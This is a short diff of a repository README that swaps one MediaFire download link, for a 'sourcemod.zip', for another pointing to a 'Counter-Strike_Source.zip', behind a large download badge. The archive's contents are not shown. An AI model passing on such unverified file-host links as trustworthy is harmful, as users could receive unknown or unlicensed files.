@@ -33,7 +33,7 @@
 ## 📦 Download
 
 <p align="center">
-  <a href="https://www.mediafire.com/file/9d17o71rex8206x/sourcemod.zip/file">
+  <a href="https://www.mediafire.com/file/128l9ibb7c0c24z/Counter-Strike_Source.zip/file">
     <img align="left" src="https://img.shields.io/badge/Download-ZIP%20Package-red?style=for-the-badge" /> <br>
   </a>
 </p>
